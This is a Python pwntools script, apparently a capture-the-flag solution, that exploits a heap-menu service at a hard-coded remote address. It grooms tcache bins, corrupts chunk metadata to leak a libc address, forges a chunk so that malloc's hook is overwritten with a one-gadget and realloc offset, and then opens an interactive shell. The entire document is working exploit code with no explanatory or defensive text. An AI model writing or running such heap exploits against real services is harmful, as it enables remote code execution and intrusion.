#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.23"
#port = 8888
host = "111.186.63.20"
port = 10001
context.arch = "amd64"    
r = remote(host,port)

def alloc(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def update(idx,data):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(len(data)))
    r.recvuntil(":")
    r.send(data)

def free(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def use_tcache(size,count):
    for i in range(count):
        alloc(size)
    for i in range(count):
        free(i)

def use_mem(size):
    for i in range(16):
        alloc(size)
    for i in range(16):
        free(i)

def shik():
    alloc(0x28)
    update(0,"a"*0x28)
    alloc(0x18)
    update(1,"a"*0x18)
    alloc(0x38)
    update(2,"a"*0x38)
    alloc(0x48)
    update(3,"a"*0x48)
    alloc(0x58)
    update(4,"a"*0x58)
    for i in range(5):
        free(i)
use_tcache(0x10,1)
use_tcache(0x20,1)
use_tcache(0x30,1)
use_tcache(0x40,1)
use_tcache(0x50,1)
for i in range(5):
    shik()
use_tcache(0x10,1)
use_tcache(0x20,1)
use_tcache(0x30,1)
use_tcache(0x40,1)
use_tcache(0x50,1)
for i in range(7):
    alloc(0x40)
update(4,"a"*0x30 + p64(0x100))
alloc(0x40) # 7
alloc(0x10) # 8
for i in range(7):
    free(i)
alloc(0x30) # 0 
alloc(0x18) # 1
update(1,"a"*0x18)

alloc(0x28) # 2
alloc(0x40) # 3
alloc(0x40) # 4
update(2,"a"*0x20 + p64(0x30)[:7])
free(7)
free(2)
alloc(0x30) # 2
show(3)
r.recvuntil(" Chunk[3]: ")
r.recvuntil(p64(0x1e1))
libc = u64(r.recvuntil("\x00\x00")) - 0x1e4ca0
print hex(libc)
free(4)
alloc(0x50) # 4
fake = libc +0x1e4c6d
update(4,"a"*0x30 + p64(0) + p64(0x51) + p64(fake))
alloc(0x50) # 5
free(5)
alloc(0x40) # 5
alloc(0x40) # 6
hook = libc + 0x1e4c20 - 8
update(6,"\x00"*35 + p64(hook))
alloc(0x40) #7
alloc(0x40) #8
alloc(0x40) #9
alloc(0x40) #10
magic = libc + 0x103f50
realloc = libc + 0x965ba
update(11,p64(magic) + p64(realloc))
alloc(32)
r.interactive()


